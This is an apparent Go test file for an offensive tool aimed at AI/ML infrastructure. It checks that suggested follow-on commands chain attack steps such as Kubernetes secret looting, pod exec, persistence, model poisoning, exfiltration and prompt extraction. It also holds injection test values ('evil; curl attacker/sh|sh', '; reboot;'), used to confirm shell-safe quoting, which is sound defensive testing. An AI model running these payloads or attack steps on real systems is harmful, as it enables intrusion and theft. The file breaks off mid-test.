package main

import (
	"strings"
	"testing"

	"github.com/professor-moody/aipostex/internal/credchain"
	"github.com/professor-moody/aipostex/internal/output"
	"github.com/professor-moody/aipostex/pkg/exploit/k8s"
	openaicompat "github.com/professor-moody/aipostex/pkg/exploit/openaicompat"
	"github.com/professor-moody/aipostex/pkg/exploit/triton"
	"github.com/professor-moody/aipostex/pkg/fingerprint"
	"github.com/professor-moody/aipostex/pkg/report"
)

// Next Actions commands render on one intact line even when they exceed the frame — a
// long command is never wrapped onto a second line that reads like a new command.
func TestPrintWorkflowPlansCommandsRenderOneLine(t *testing.T) {
	output.SetConsoleWidth(60)
	defer output.SetConsoleWidth(400)
	longCmd := "aipostex scan targets --target http://172.16.50.20:4000 --tags litellm,llmjacking,openai-compatible"
	var out strings.Builder
	printWorkflowPlans(&out, []workflowPlan{{
		Target: "http://172.16.50.20:4000",
		Stage:  "enum",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(longCmd, "sweep the proxy", false, 10),
		},
	}}, false)
	if !strings.Contains(out.String(), "\n    "+longCmd+"\n") {
		t.Fatalf("expected the long command intact on one line at width 60, got %q", out.String())
	}
}

func TestBuildScanNetworkWorkflowPlanOrdersReadBeforeGated(t *testing.T) {
	plan := buildScanNetworkWorkflowPlan(fingerprint.Result{
		Service: "ollama",
		URL:     "http://127.0.0.1:11434",
	})
	if len(plan.Recommendations) < 3 {
		t.Fatalf("expected scan-network ollama workflow recommendations, got %#v", plan)
	}
	if plan.Recommendations[0].Gated {
		t.Fatalf("expected first recommendation to be read-only, got %#v", plan.Recommendations[0])
	}
	if !plan.Recommendations[len(plan.Recommendations)-1].Gated {
		t.Fatalf("expected last recommendation to be gated, got %#v", plan.Recommendations[len(plan.Recommendations)-1])
	}
}

// kube-apiserver must get a module-specific plan (enum->exploit ladder), not the generic
// fallback — k8s was the one headline module missing from the workflow switch.
func TestBuildScanNetworkWorkflowPlanK8s(t *testing.T) {
	plan := buildScanNetworkWorkflowPlan(fingerprint.Result{
		Service: "kube-apiserver",
		URL:     "https://127.0.0.1:6443",
	})
	if len(plan.Recommendations) < 4 {
		t.Fatalf("expected a module-specific kube-apiserver plan, got %#v", plan)
	}
	var joined string
	for _, r := range plan.Recommendations {
		joined += r.Command + "\n"
	}
	for _, want := range []string{"k8s --target", "rbac-probe", "secret-read", "sa-loot", "pod-exec"} {
		if !strings.Contains(joined, want) {
			t.Errorf("kube-apiserver plan missing %q; got:\n%s", want, joined)
		}
	}
	if plan.Recommendations[0].Gated {
		t.Errorf("first k8s recommendation should be read-only, got %#v", plan.Recommendations[0])
	}
	if !plan.Recommendations[len(plan.Recommendations)-1].Gated {
		t.Errorf("last k8s recommendation should be gated, got %#v", plan.Recommendations[len(plan.Recommendations)-1])
	}
}

func TestSuppressWorkflowCommandsExactMatchOnly(t *testing.T) {
	plan := workflowPlan{
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation("cmd one", "first", false, 10),
			newWorkflowRecommendation("cmd two", "second", false, 20),
			newWorkflowRecommendation("cmd two --extra", "third", false, 30),
		},
	}

	filtered := suppressWorkflowCommands(plan, "cmd two")
	if len(filtered.Recommendations) != 2 {
		t.Fatalf("expected 2 recommendations after suppression, got %#v", filtered.Recommendations)
	}
	if filtered.Recommendations[0].Command != "cmd one" {
		t.Fatalf("expected first command preserved, got %#v", filtered.Recommendations)
	}
	if filtered.Recommendations[1].Command != "cmd two --extra" {
		t.Fatalf("expected only exact match to be removed, got %#v", filtered.Recommendations)
	}
}

func TestSuppressWorkflowCommandsCanEmptyPlan(t *testing.T) {
	plan := workflowPlan{
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation("cmd one", "only", false, 10),
		},
	}

	filtered := suppressWorkflowCommands(plan, "cmd one")
	if len(filtered.Recommendations) != 0 {
		t.Fatalf("expected empty recommendations, got %#v", filtered.Recommendations)
	}
}

func TestWorkflowBuildersUseDiscoveredValuesWhenAvailable(t *testing.T) {
	vectorPlan := buildVectorDBCollectionWorkflowPlan("http://127.0.0.1:8000", "chromadb", "docs")
	if !strings.Contains(vectorPlan.Recommendations[0].Command, "--collection docs") {
		t.Fatalf("expected discovered collection in workflow command, got %q", vectorPlan.Recommendations[0].Command)
	}

	jupyterPlan := buildJupyterNotebookWorkflowPlan("http://127.0.0.1:8888", "team/demo.ipynb")
	if !strings.Contains(jupyterPlan.Recommendations[0].Command, "--path team/demo.ipynb") {
		t.Fatalf("expected discovered notebook path in workflow command, got %q", jupyterPlan.Recommendations[0].Command)
	}

	mlflowPlan := buildMLflowRunWorkflowPlan("http://127.0.0.1:5000", "run-1", "model/MLmodel")
	if !strings.Contains(mlflowPlan.Recommendations[1].Command, "--run-id run-1 --artifact-path model/MLmodel") {
		t.Fatalf("expected discovered mlflow identifiers in workflow command, got %#v", mlflowPlan.Recommendations)
	}

	gradioPlan := buildGradioEndpointWorkflowPlan("http://127.0.0.1:7860", "predict", 2)
	if !strings.Contains(gradioPlan.Recommendations[0].Command, "--api-name predict") {
		t.Fatalf("expected discovered gradio api name in workflow command, got %q", gradioPlan.Recommendations[0].Command)
	}
	if !strings.Contains(gradioPlan.Recommendations[1].Command, "--fn-index 2") {
		t.Fatalf("expected discovered gradio fn index in workflow command, got %#v", gradioPlan.Recommendations)
	}

	// k8s enum: the discovered workload's namespace fills access-review / sa-loot /
	// pod-exec — the on-screen Act 6 follow-ons must name a real namespace.
	k8sPlan := buildK8sEnumWorkflowPlan("https://127.0.0.1:6443",
		[]string{"kube-system", "mlflow"},
		[]k8s.Workload{{Kind: "Pod", Name: "trainer-0", Namespace: "mlflow"}})
	k8sJoined := joinRecommendationCommands(k8sPlan.Recommendations)
	if !strings.Contains(k8sJoined, "access-review --namespace mlflow") {
		t.Fatalf("expected discovered k8s namespace in access-review, got %q", k8sJoined)
	}
	if !strings.Contains(k8sJoined, "sa-loot --namespace mlflow") || !strings.Contains(k8sJoined, "pod-exec --namespace mlflow") {
		t.Fatalf("expected discovered k8s namespace in sa-loot/pod-exec, got %q", k8sJoined)
	}

	// a2a: a concrete task id anchors the lifecycle follow-ons.
	a2aPlan := buildA2AAgentWorkflowPlan("http://127.0.0.1:8100", "task-abc123")
	if !strings.Contains(a2aPlan.Recommendations[0].Command, "--task-id task-abc123") {
		t.Fatalf("expected discovered a2a task id in workflow command, got %q", a2aPlan.Recommendations[0].Command)
	}

	// mlflow model-artifacts: the model version's backing run id fills download-artifact.
	mlflowArtifactPlan := buildMLflowModelArtifactsSummaryWorkflowPlan("http://127.0.0.1:5000", "demo-model", "3", "run-9", "model/data")
	if !strings.Contains(mlflowArtifactPlan.Recommendations[0].Command, "--run-id run-9 --artifact-path model/data") {
		t.Fatalf("expected discovered mlflow run id in model-artifacts command, got %q", mlflowArtifactPlan.Recommendations[0].Command)
	}
}

// joinRecommendationCommands concatenates a plan's commands for substring assertions.
func joinRecommendationCommands(recs []workflowRecommendation) string {
	var b strings.Builder
	for _, r := range recs {
		b.WriteString(r.Command)
		b.WriteString("\n")
	}
	return b.String()
}

// TestBuildA2AOffensiveWorkflowPlan is the follow-on-presence regression for the a2a
// single-node offensive verbs: each must emit accurate recommendations that chain to an
// EXISTING a2a verb, carry no unfilled placeholders, and preserve a discovered task id.
func TestBuildA2AOffensiveWorkflowPlan(t *testing.T) {
	target := "http://127.0.0.1:8103"
	knownVerbs := []string{
		"skills", "task-send", "task-status", "task-cancel", "stream-probe",
		"delegate-probe", "card-spoof", "sender-spoof", "msg-integrity", "replay",
		"push-hijack", "mcp-pivot", "scrape-loop", "tool-inject",
	}
	actions := []string{
		"card-spoof", "push-hijack", "msg-integrity", "sender-spoof",
		"replay", "delegate-probe", "mcp-pivot", "auth-probe",
	}
	for _, action := range actions {
		plan := buildA2AOffensiveWorkflowPlan(target, action, "")
		if len(plan.Recommendations) == 0 {
			t.Errorf("%s: expected follow-on recommendations, got none", action)
			continue
		}
		if plan.ChainSource != "a2a-"+action {
			t.Errorf("%s: ChainSource=%q, want a2a-%s", action, plan.ChainSource, action)
		}
		joined := joinRecommendationCommands(plan.Recommendations)
		for _, r := range plan.Recommendations {
			if !strings.Contains(r.Command, "a2a --target "+target+" ") {
				t.Errorf("%s: recommendation does not target this a2a agent: %q", action, r.Command)
			}
			if strings.Contains(r.Command, "<") {
				t.Errorf("%s: recommendation carries an unfilled placeholder: %q", action, r.Command)
			}
		}
		hasKnown := false
		for _, v := range knownVerbs {
			if strings.Contains(joined, " "+v) {
				hasKnown = true
				break
			}
		}
		if !hasKnown {
			t.Errorf("%s: no recommendation chains to a known a2a verb:\n%s", action, joined)
		}
	}
	// push-hijack threads the concrete task id into its lifecycle follow-on.
	pushJoined := joinRecommendationCommands(buildA2AOffensiveWorkflowPlan(target, "push-hijack", "task-xyz789").Recommendations)
	if !strings.Contains(pushJoined, "--task-id task-xyz789") {
		t.Errorf("push-hijack should thread the discovered task id, got:\n%s", pushJoined)
	}
	// an unknown action yields an empty plan (no phantom recommendations).
	if empty := buildA2AOffensiveWorkflowPlan(target, "nonexistent", ""); len(empty.Recommendations) != 0 {
		t.Errorf("unknown action should yield no recommendations, got %v", empty.Recommendations)
	}
}

// TestBuildDemoModuleFollowOnPlans is the follow-on-presence regression for the
// Phase-2 kill-chain wiring (k8s escalation, jupyter exec, ray submit): each must
// emit recommendations that chain to existing verbs and thread discovered ids.
func TestBuildDemoModuleFollowOnPlans(t *testing.T) {
	// k8s: the dead-ending verbs chain into the escalation path, threading the namespace.
	for _, action := range []string{"rbac-probe", "access-review", "pod-exec", "persist"} {
		p := buildK8sExploitWorkflowPlan("https://10.0.0.1:6443", action, "ml-prod")
		if len(p.Recommendations) == 0 {
			t.Errorf("k8s %s: no follow-on", action)
		}
		joined := joinRecommendationCommands(p.Recommendations)
		if !strings.Contains(joined, "k8s --target https://10.0.0.1:6443 --insecure ") {
			t.Errorf("k8s %s: recs don't target the apiserver: %s", action, joined)
		}
		if strings.Contains(joined, "<") {
			t.Errorf("k8s %s: placeholder in recs: %s", action, joined)
		}
	}
	if k8sJoined := joinRecommendationCommands(buildK8sExploitWorkflowPlan("https://10.0.0.1:6443", "access-review", "ml-prod").Recommendations); !strings.Contains(k8sJoined, "--namespace ml-prod") {
		t.Errorf("k8s access-review should thread the namespace, got: %s", k8sJoined)
	}
	// pod-exec chains into persistence.
	if pe := joinRecommendationCommands(buildK8sExploitWorkflowPlan("https://10.0.0.1:6443", "pod-exec", "ml-prod").Recommendations); !strings.Contains(pe, "persist --namespace ml-prod --force-exploit") {
		t.Errorf("k8s pod-exec should chain to persist, got: %s", pe)
	}
	if len(buildK8sExploitWorkflowPlan("https://10.0.0.1:6443", "nope", "").Recommendations) != 0 {
		t.Error("unknown k8s action should yield an empty plan")
	}

	// jupyter exec: chains to persist / proof verbs on the same kernel.
	jj := joinRecommendationCommands(buildJupyterExecWorkflowPlan("http://10.0.0.1:8888", "kernel-abc").Recommendations)
	if !strings.Contains(jj, "persist --kernel kernel-abc") || !strings.Contains(jj, "pip-proof --kernel kernel-abc") {
		t.Errorf("jupyter exec should chain kernel-scoped persist/pip-proof, got: %s", jj)
	}

	// ray submit: threads the job id into job-logs / runtime-env.
	rj := joinRecommendationCommands(buildRaySubmitWorkflowPlan("http://10.0.0.1:8265", "raysubmit_123").Recommendations)
	if !strings.Contains(rj, "job-logs --job-id raysubmit_123") || !strings.Contains(rj, "runtime-env --job-id raysubmit_123") {
		t.Errorf("ray submit should thread the job id, got: %s", rj)
	}
}

// TestBuildBatch2FollowOnPlans covers the P2 batch-2 demo-module wiring
// (openai-compat inference, vectordb RAG-poison, ollama model-manipulation, mcp
// poison) — identifier threading, valid flags, no placeholders, honesty gating.
func TestBuildBatch2FollowOnPlans(t *testing.T) {
	// openai-compat inference chains to the prompt/tool probes and threads --model;
	// it must NOT use the generate-only --prompt flag (the review flagged that).
	oai := joinRecommendationCommands(buildOpenAICompatInferenceWorkflowPlan("http://h:4000", "gpt-x").Recommendations)
	if !strings.Contains(oai, "prompt-test --model gpt-x") || !strings.Contains(oai, "prompt-extract --model gpt-x") {
		t.Errorf("openai-compat inference should thread --model into the prompt probes: %s", oai)
	}
	if strings.Contains(oai, "--prompt ") {
		t.Errorf("openai-compat follow-on must not use the generate-only --prompt flag: %s", oai)
	}

	// vectordb: thread --type + --collection, chain to existing verbs, no placeholder.
	for _, p := range []workflowPlan{
		buildVDBExtractWorkflowPlan("http://h:8000", "chromadb", "kb"),
		buildVDBSearchWorkflowPlan("http://h:8000", "chromadb", "kb"),
		buildVDBInjectWorkflowPlan("http://h:8000", "chromadb", "kb"),
	} {
		j := joinRecommendationCommands(p.Recommendations)
		if len(p.Recommendations) == 0 || !strings.Contains(j, "--type chromadb") || !strings.Contains(j, "--collection kb") {
			t.Errorf("vectordb plan should thread engine+collection: %s", j)
		}
		if strings.Contains(j, "<") {
			t.Errorf("vectordb plan carries a placeholder: %s", j)
		}
	}

	// ollama: generate->exfiltrate, poison->verify+exfiltrate the new model; unknown->empty.
	og := joinRecommendationCommands(buildOllamaExploitWorkflowPlan("http://h:11434", "generate", "smol").Recommendations)
	if !strings.Contains(og, "exfiltrate --model smol") {
		t.Errorf("ollama generate should chain to exfiltrate: %s", og)
	}
	op := joinRecommendationCommands(buildOllamaExploitWorkflowPlan("http://h:11434", "poison", "smol-bd").Recommendations)
	if !strings.Contains(op, "generate --model smol-bd") || !strings.Contains(op, "exfiltrate --model smol-bd") {
		t.Errorf("ollama poison should verify+exfiltrate the new model: %s", op)
	}
	if opv := joinRecommendationCommands(buildOllamaExploitWorkflowPlan("http://h:11434", "poison-verify", "smol-bd").Recommendations); !strings.Contains(opv, "exfiltrate --model smol-bd") {
		t.Errorf("ollama poison-verify should chain to exfiltrate the confirmed model: %s", opv)
	}
	if len(buildOllamaExploitWorkflowPlan("http://h:11434", "nope", "x").Recommendations) != 0 {
		t.Error("unknown ollama action should yield an empty plan")
	}

	// mcp poison: honesty gate — a weak signal collapses to the single ungated env-extract step.
	strong := buildMCPPoisonWorkflowPlan("http://h:3000", "cmd-inject", "shell", "likely-executed")
	weak := buildMCPPoisonWorkflowPlan("http://h:3000", "cmd-inject", "shell", "no-signal")
	if len(weak.Recommendations) != 1 || len(strong.Recommendations) <= 1 {
		t.Errorf("mcp poison should collapse on a weak signal (weak=%d strong=%d)", len(weak.Recommendations), len(strong.Recommendations))
	}
	for _, r := range weak.Recommendations {
		if r.Gated {
			t.Errorf("mcp weak-signal follow-on should be ungated (env-extract only), got gated: %s", r.Command)
		}
	}
}

// TestBuildWS1P3FollowOnPlans covers the long-tail (non-demo) module follow-on
// builders: every one must emit at least one recommendation, never carry a
// "<placeholder>" inside a GATED command, chain only to verbs that exist, and
// render discovered/threaded values shell-safe.
func TestBuildWS1P3FollowOnPlans(t *testing.T) {
	plans := map[string]workflowPlan{
		"tfserving-predict":     buildTFServingPredictWorkflowPlan("http://h:8501", "resnet"),
		"tfserving-metrics":     buildTFServingMetricsWorkflowPlan("http://h:8501"),
		"bentoml-predict":       buildBentoPredictWorkflowPlan("http://h:3000"),
		"bentoml-metrics":       buildBentoMetricsWorkflowPlan("http://h:3000"),
		"triton-model-config":   buildTritonExploitWorkflowPlan("http://h:8000", "model-config", "resnet"),
		"triton-infer":          buildTritonExploitWorkflowPlan("http://h:8000", "infer", "resnet"),
		"triton-model-load":     buildTritonExploitWorkflowPlan("http://h:8000", "model-load", "resnet"),
		"triton-model-unload":   buildTritonExploitWorkflowPlan("http://h:8000", "model-unload", "resnet"),
		"triton-shm-probe":      buildTritonExploitWorkflowPlan("http://h:8000", "shm-probe", ""),
		"hf-models":             buildHFExploitWorkflowPlan("http://h:8080", "models", "acme/model"),
		"hf-metrics":            buildHFExploitWorkflowPlan("http://h:8080", "metrics", ""),
		"hf-generate":           buildHFExploitWorkflowPlan("http://h:8080", "generate", ""),
		"hf-embed":              buildHFExploitWorkflowPlan("http://h:8080", "embed", ""),
		"wandb-projects":        buildWandBExploitWorkflowPlan("http://h:8080", "projects", "acme", "proj"),
		"wandb-runs":            buildWandBExploitWorkflowPlan("http://h:8080", "runs", "acme", "proj"),
		"wandb-artifacts":       buildWandBExploitWorkflowPlan("http://h:8080", "artifacts", "acme", "proj"),
		"wandb-secrets":         buildWandBExploitWorkflowPlan("http://h:8080", "secrets", "acme", "proj"),
		"kubeflow-runs":         buildKFExploitWorkflowPlan("http://h:8080", "runs", "pipe-1"),
		"kubeflow-experiments":  buildKFExploitWorkflowPlan("http://h:8080", "experiments", ""),
		"kubeflow-notebooks":    buildKFExploitWorkflowPlan("http://h:8080", "notebooks", "http://nb:8888"),
		"kubeflow-run-pipeline": buildKFExploitWorkflowPlan("http://h:8080", "run-pipeline", ""),
		"litellm-config":        buildLiteLLMExploitWorkflowPlan("http://h:4000", "config-extract", ""),
		"litellm-budget":        buildLiteLLMExploitWorkflowPlan("http://h:4000", "budget-probe", ""),
		"litellm-proxy":         buildLiteLLMExploitWorkflowPlan("http://h:4000", "proxy-chain", ""),
		"litellm-keygen":        buildLiteLLMExploitWorkflowPlan("http://h:4000", "key-gen", "sk-minted-123"),
		"a2a-scrape-loop":       buildA2AOffensiveWorkflowPlan("http://h:8103", "scrape-loop", ""),
	}
	for name, p := range plans {
		if len(p.Recommendations) == 0 {
			t.Errorf("%s: expected at least one recommendation", name)
		}
		for _, r := range p.Recommendations {
			if r.Gated && strings.Contains(r.Command, "<") {
				t.Errorf("%s: gated command carries a placeholder: %s", name, r.Command)
			}
		}
	}

	// Chain-to-existing-verb spot checks — each target must be a real verb.
	assertChains := func(name string, want ...string) {
		joined := joinRecommendationCommands(plans[name].Recommendations)
		for _, w := range want {
			if !strings.Contains(joined, w) {
				t.Errorf("%s: expected follow-on to contain %q, got: %s", name, w, joined)
			}
		}
	}
	assertChains("triton-model-load", "infer --model resnet", "model-unload --model resnet")
	assertChains("triton-shm-probe", "triton --target http://h:8000 models")
	assertChains("hf-models", "model-download --model-id acme/model", "generate")
	assertChains("wandb-secrets", "report view <dossier-dir> --credentials")
	assertChains("kubeflow-notebooks", "jupyter --target http://nb:8888 enum", "start-kernel --force-exploit")
	assertChains("kubeflow-runs", "run-pipeline --pipeline-id pipe-1")
	assertChains("litellm-keygen", "proxy-chain --api-key sk-minted-123", "report view <dossier-dir> --credentials")
	assertChains("litellm-config", "key-gen --force-exploit", "proxy-chain")
	assertChains("a2a-scrape-loop", "report view <dossier-dir> --credentials", "mcp-pivot")

	// A model-scoped triton verb with no discovered model must NOT emit a gated
	// command carrying a placeholder — it degrades to an empty plan instead.
	if p := buildTritonExploitWorkflowPlan("http://h:8000", "model-config", ""); len(p.Recommendations) != 0 {
		t.Errorf("triton model-config with no model should yield an empty plan, got: %v", p.Recommendations)
	}
	// An unknown action yields an empty plan for each switch-based builder.
	for _, empty := range []workflowPlan{
		buildTritonExploitWorkflowPlan("http://h:8000", "nope", "m"),
		buildHFExploitWorkflowPlan("http://h:8080", "nope", "m"),
		buildWandBExploitWorkflowPlan("http://h:8080", "nope", "e", "p"),
		buildKFExploitWorkflowPlan("http://h:8080", "nope", ""),
		buildLiteLLMExploitWorkflowPlan("http://h:4000", "nope", ""),
	} {
		if len(empty.Recommendations) != 0 {
			t.Errorf("unknown action should yield an empty plan, got: %v", empty.Recommendations)
		}
	}

	// Threaded discovered values must render shell-safe (single-quoted), never raw.
	const hostile = "evil; curl attacker/sh|sh"
	const quoted = `'evil; curl attacker/sh|sh'`
	assertShellSafe(t, "triton model", joinRecommendationCommands(buildTritonExploitWorkflowPlan("http://h:8000", "model-load", hostile).Recommendations), hostile, quoted)
	assertShellSafe(t, "hf model-id", joinRecommendationCommands(buildHFExploitWorkflowPlan("http://h:8080", "models", hostile).Recommendations), hostile, quoted)
	assertShellSafe(t, "litellm minted key", joinRecommendationCommands(buildLiteLLMExploitWorkflowPlan("http://h:4000", "key-gen", hostile).Recommendations), hostile, quoted)
	assertShellSafe(t, "wandb entity/project", joinRecommendationCommands(buildWandBExploitWorkflowPlan("http://h:8080", "runs", hostile, hostile).Recommendations), hostile, quoted)
}

// Discovered identifiers are TARGET-controlled, so a hostile value must not turn a
// suggested copy-paste command into operator-side shell injection. Every builder must
// render such values shell-safe (single-quoted), not concatenate them raw.
func TestWorkflowBuildersRenderHostileDiscoveredValuesShellSafe(t *testing.T) {
	const hostile = "evil; curl attacker/sh|sh"
	const quoted = `'evil; curl attacker/sh|sh'`

	// triton model name from RepositoryIndex()
	triPlan := buildTritonModelsWorkflowPlan("https://127.0.0.1:8000", []triton.ModelRepoEntry{{Name: hostile}})
	assertShellSafe(t, "triton model", joinRecommendationCommands(triPlan.Recommendations), hostile, quoted)

	// wandb entity from the viewer identity
	wbPlan := buildWandBEnumWorkflowPlan("http://127.0.0.1:8080", hostile, "proj")
	assertShellSafe(t, "wandb entity", joinRecommendationCommands(wbPlan.Recommendations), hostile, quoted)

	// k8s namespace / workload name from the API server
	k8sPlan := buildK8sEnumWorkflowPlan("https://127.0.0.1:6443", []string{hostile},
		[]k8s.Workload{{Kind: "Pod", Name: "p", Namespace: hostile}})
	assertShellSafe(t, "k8s namespace", joinRecommendationCommands(k8sPlan.Recommendations), hostile, quoted)

	// gradio file ref returned by a predict response
	grPlan := buildGradioPredictWorkflowPlan("http://127.0.0.1:7860", []string{hostile}, "predict", 0)
	assertShellSafe(t, "gradio file-ref", joinRecommendationCommands(grPlan.Recommendations), hostile, quoted)

	// mlflow run id / artifact path
	mlPlan := buildMLflowRunWorkflowPlan("http://127.0.0.1:5000", hostile, "a/b")
	assertShellSafe(t, "mlflow run-id", joinRecommendationCommands(mlPlan.Recommendations), hostile, quoted)

	// jupyter looted credential embedded in a --header argument: the WHOLE header
	// value must be single-quoted so a secret containing " or ; can't break out of
	// the surrounding quotes (the old vulnerable form used double quotes).
	jpPlan := buildJupyterCredentialWorkflowPlan("http://127.0.0.1:8888", "nb.ipynb", "HuggingFace Token", `hf_x"; reboot; "`)
	jpCmds := joinRecommendationCommands(jpPlan.Recommendations)
	if !strings.Contains(jpCmds, "--header 'Authorization: Bearer hf_x") {
		t.Fatalf("jupyter credential header not single-quoted (injectable): %q", jpCmds)
	}
	if strings.Contains(jpCmds, `--header "`) {
		t.Fatalf("jupyter credential header uses the vulnerable double-quoted form: %q", jpCmds)
	}
}

// assertShellSafe fails if the raw hostile value appears un-quoted (an injection) or
// the expected single-quoted form is absent.
func assertShellSafe(t *testing.T, label, commands, hostile, quoted string) {
	t.Helper()
	if !strings.Contains(commands, quoted) {
		t.Fatalf("%s: expected shell-quoted value %q in commands, got:\n%s", label, quoted, commands)
	}
	// The raw hostile string must never appear except inside the quoted form.
	if strings.Contains(strings.ReplaceAll(commands, quoted, ""), hostile) {
		t.Fatalf("%s: hostile value appears un-quoted (injectable), got:\n%s", label, commands)
	}
}

// The completeness mandate: a builder must never emit a "<placeholder>" token in a
// command when the discovering flow didn't learn that id — it either fills the real
// value or degrades to a different, honest command (never a placeholder command).
func TestWorkflowBuildersEmitNoPlaceholderWhenIDUnknown(t *testing.T) {
	// a2a with no task id: must NOT emit "<task-id>"; instead suggests obtaining one.
	a2aNoTask := buildA2AAgentWorkflowPlan("http://127.0.0.1:8100", "")
	a2aJoined := joinRecommendationCommands(a2aNoTask.Recommendations)
	if strings.Contains(a2aJoined, "<task-id>") {
		t.Fatalf("a2a plan leaked a <task-id> placeholder with no task: %q", a2aJoined)
	}
	if !strings.Contains(a2aJoined, "task-send") {
		t.Fatalf("expected a2a no-task plan to suggest task-send, got %q", a2aJoined)
	}

	// k8s enum with no workloads: the pod-scoped steps (sa-loot/pod-exec) need a live
	// pod, so they must be omitted rather than emitted with a "<namespace>" placeholder.
	k8sNoWorkloads := buildK8sEnumWorkflowPlan("https://127.0.0.1:6443", []string{"default"}, nil)
	k8sJoined := joinRecommendationCommands(k8sNoWorkloads.Recommendations)
	if strings.Contains(k8sJoined, "<namespace>") {
		t.Fatalf("k8s plan leaked a <namespace> placeholder: %q", k8sJoined)
	}
	if strings.Contains(k8sJoined, "sa-loot") || strings.Contains(k8sJoined, "pod-exec") {
		t.Fatalf("k8s plan emitted pod-scoped steps with no discovered workload: %q", k8sJoined)
	}
	if !strings.Contains(k8sJoined, "access-review --namespace default") {
		t.Fatalf("expected access-review to use the discovered namespace, got %q", k8sJoined)
	}
}

func TestMLflowExperimentSummaryPlanSuppressesCurrentCommand(t *testing.T) {
	current := formatCommandExample("mlflow --target http://127.0.0.1:5000 experiments --experiment demo --limit 5")
	plan := suppressWorkflowCommands(
		buildMLflowEnumWorkflowPlan("http://127.0.0.1:5000", []string{"demo"}, nil),
		current,
	)
	for _, rec := range plan.Recommendations {
		if rec.Command == current {
			t.Fatalf("expected current command to be suppressed, got %#v", plan.Recommendations)
		}
	}
	if len(plan.Recommendations) == 0 || !strings.Contains(plan.Recommendations[0].Command, "runs --experiment demo --limit 5") {
		t.Fatalf("expected runs follow-on to remain, got %#v", plan.Recommendations)
	}

	metadata := attachWorkflowToMetadata(map[string]interface{}{}, plan)
	workflow := metadata["workflow"].(map[string]interface{})
	recommendations := workflow["recommendations"].([]map[string]interface{})
	for _, rec := range recommendations {
		if rec["command"] == current {
			t.Fatalf("expected metadata recommendations to omit current command, got %#v", recommendations)
		}
	}
}

func TestMLflowRunsSummaryPlanSuppressesCurrentCommand(t *testing.T) {
	current := formatCommandExample("mlflow --target http://127.0.0.1:5000 runs --experiment demo --limit 5")
	plan := suppressWorkflowCommands(
		buildMLflowEnumWorkflowPlan("http://127.0.0.1:5000", []string{"demo"}, []string{"run-1"}),
		current,
	)
	for _, rec := range plan.Recommendations {
		if rec.Command == current {
			t.Fatalf("expected current command to be suppressed, got %#v", plan.Recommendations)
		}
	}
	if len(plan.Recommendations) == 0 || !strings.Contains(plan.Recommendations[0].Command, "experiments --experiment demo --limit 5") {
		t.Fatalf("expected experiment follow-on to remain, got %#v", plan.Recommendations)
	}
}

func TestJupyterKernelsSummaryPlanSuppressesCurrentCommand(t *testing.T) {
	current := formatCommandExample("jupyter --target http://127.0.0.1:8888 kernels")
	plan := suppressWorkflowCommands(
		buildJupyterEnumWorkflowPlan("http://127.0.0.1:8888", nil, []string{"kernel-1"}),
		current,
	)
	for _, rec := range plan.Recommendations {
		if rec.Command == current {
			t.Fatalf("expected current command to be suppressed, got %#v", plan.Recommendations)
		}
	}
	if len(plan.Recommendations) == 0 || !strings.Contains(plan.Recommendations[0].Command, "jupyter --target http://127.0.0.1:8888 notebooks") {
		t.Fatalf("expected notebooks follow-on to remain, got %#v", plan.Recommendations)
	}
}

func TestOpenAICompatValidatePlanSuppressesCurrentCommand(t *testing.T) {
	current := formatCommandExample("openai-compat --target http://127.0.0.1:8000 validate-inference --model demo-model")
	plan := suppressWorkflowCommands(
		buildOpenAICompatEnumWorkflowPlan("http://127.0.0.1:8000", []string{"demo-model"}, []string{"demo-model"}),
		current,
	)
	for _, rec := range plan.Recommendations {
		if rec.Command == current {
			t.Fatalf("expected current command to be suppressed, got %#v", plan.Recommendations)
		}
	}
	if !strings.Contains(plan.Recommendations[0].Command, "auth-sweep") {
		t.Fatalf("expected auth-sweep to remain first, got %#v", plan.Recommendations)
	}
}

func TestOpenAICompatEnumPlanPrefersLocalModelForValidation(t *testing.T) {
	plan := buildOpenAICompatEnumWorkflowPlan(
		"http://127.0.0.1:4000",
		[]string{"azure-gpt4", "bedrock-claude", "local-smollm"},
		[]string{"bedrock-claude"},
	)

	var validateCommand, throughputCommand string
	for _, rec := range plan.Recommendations {
		switch {
		case strings.Contains(rec.Command, "validate-inference"):
			validateCommand = rec.Command
		case strings.Contains(rec.Command, "throughput"):
			throughputCommand = rec.Command
		}
	}
	if !strings.Contains(validateCommand, "--model local-smollm") {
		t.Fatalf("expected reliable local model for validation, got %q", validateCommand)
	}
	if !strings.Contains(throughputCommand, "--model bedrock-claude") {
		t.Fatalf("expected high-value model retained for gated throughput, got %q", throughputCommand)
	}
}

func TestOpenAICompatAuthFollowOnModelPrefersAttemptedLocalModel(t *testing.T) {
	result := &openaicompat.AuthSweepResult{
		BestModel: "bedrock-claude",
		AcceptedPatterns: []openaicompat.AuthSweepPattern{
			{
				Label:             "provided-authorization",
				AcceptedInventory: true,
				Model:             "bedrock-claude",
				ModelAttempts: []openaicompat.ModelAttempt{
					{Model: "bedrock-claude", FailureClass: "backend-dependency-missing"},
					{Model: "azure-gpt4", FailureClass: "model-route-error"},
					{Model: "local-smollm", FailureClass: "unknown"},
				},
			},
		},
	}
	if got := preferredOpenAICompatAuthFollowOnModel(result, ""); got != "local-smollm" {
		t.Fatalf("expected local-smollm follow-on model, got %q", got)
	}
	if authSweepAllInferenceFailuresAreBackend(result.AcceptedPatterns) {
		t.Fatal("mixed backend and coherence failures should not trigger backend-only triage")
	}
}

func TestOpenAICompatPromptExtractPlanSuppressesCurrentCommand(t *testing.T) {
	current := formatCommandExample("openai-compat --target http://127.0.0.1:8000 prompt-extract --model demo-model")
	plan := suppressWorkflowCommands(
		buildOpenAICompatEnumWorkflowPlan("http://127.0.0.1:8000", []string{"demo-model"}, nil),
		current,
	)
	for _, rec := range plan.Recommendations {
		if rec.Command == current {
			t.Fatalf("expected current command to be suppressed, got %#v", plan.Recommendations)
		}
	}
	if len(plan.Recommendations) == 0 || !strings.Contains(plan.Recommendations[0].Command, "auth-sweep") {
		t.Fatalf("expected auth-sweep follow-on to remain, got %#v", plan.Recommendations)
	}
}

func TestOpenAICompatPromptTestPlanSuppressesCurrentCommand(t *testing.T) {
	current := formatCommandExample("openai-compat --target http://127.0.0.1:8000 prompt-test --model demo-model")
	plan := suppressWorkflowCommands(
		buildOpenAICompatEnumWorkflowPlan("http://127.0.0.1:8000", []string{"demo-model"}, nil),
		current,
	)
	for _, rec := range plan.Recommendations {
